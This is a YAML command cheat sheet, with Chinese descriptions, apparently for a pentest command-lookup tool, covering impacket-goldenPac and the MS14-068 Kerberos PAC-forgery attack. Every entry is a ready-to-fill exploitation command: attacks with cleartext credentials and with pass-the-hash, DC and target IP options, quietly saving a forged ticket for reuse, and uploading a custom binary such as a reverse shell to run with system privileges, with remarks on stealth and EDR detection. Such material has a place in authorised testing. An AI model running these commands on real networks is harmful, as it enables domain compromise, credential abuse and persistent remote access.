tool: impacket-goldenPac
tags: [network, security, pentest, exploitation, active-directory, impacket, kerberos, ms14-068]

actions:
  # === BASIC EXPLOITATION ===
  - title: impacket-goldenPac - 基础 MS14-068 利用
    desc: |
      使用明文凭据对目标机器执行完整的 MS14-068 漏洞利用。
      它会自动向域控制器请求伪造的 PAC，获得管理员访问权限，并执行远程命令（默认为 cmd.exe）。
      当你拥有一组有效的域用户凭据且目标可能未打补丁时，这是标准的起点。
    command: "impacket-goldenPac {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"

  - title: impacket-goldenPac - 使用 NTLM 哈希进行利用
    desc: |
      当你获得的是用户的 NTLM 哈希而非明文密码时使用此命令。
      这样可以采用 Pass-the-Hash（PtH）方式来利用 MS14-068 漏洞。
      请确保哈希为 LMHASH:NTHASH 格式；如果 LM 哈希不可用，请使用标准空 LM 哈希字符串。
    command: "impacket-goldenPac -hashes {{hash}} {{domain}}/{{username}}@{{target_fqdn}}"

  # === ADVANCED CONNECTIVITY ===
  - title: impacket-goldenPac - 指定 DC 和目标 IP 地址
    desc: |
      当 DNS 解析失败或目标 FQDN 未能正确映射到期望 IP 时使用此变体。
      通过 -dc-ip 显式指定域控制器 IP 对于获取用户 SID 至关重要，SID 是伪造票据的必需组成部分。
      使用 -target-ip 可确保漏洞利用流量定向到你打算攻陷的特定主机。
    command: "impacket-goldenPac -dc-ip {{dc_ip}} -target-ip {{target_ip}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"

  - title: impacket-goldenPac - 调试与时间戳
    desc: |
      此命令启用详细的调试输出，并为每条日志记录添加时间戳。
      对于排查利用过程中的连接超时、认证失败或 Kerberos 错误非常有用。
      在实验环境或漏洞利用无故失败时使用此模式，可查看底层的 Impacket 库交互。
    command: "impacket-goldenPac -debug -ts {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"

  # === TICKET AND FILE OPERATIONS ===
  - title: impacket-goldenPac - 保存伪造票据而不执行
    desc: |
      生成伪造的 Kerberos 票据（Golden Ticket）并保存到本地 CCache 文件，而不执行任何远程操作。
      将命令指定为“None”可避免触发 PSEXEC 风格的行为，从而更加隐蔽。
      生成的文件可导出，之后通过设置 KRB5CCNAME 环境变量供其他工具使用。
    command: "impacket-goldenPac -w {{output_file|ticket.ccache}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} None"

  - title: impacket-goldenPac - 上传并执行自定义二进制文件
    desc: |
      此命令不会启动默认的 cmd.exe，而是将本地可执行文件上传到目标并以系统权限运行。
      这对于部署自定义反向 shell、后渗透代理或特定枚举工具很有用。
      请注意，向磁盘上传文件并创建服务来执行，很可能被 EDR 或杀毒软件检测到。
    command: "impacket-goldenPac -c {{local_binary_path}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} {{binary_arguments|}}"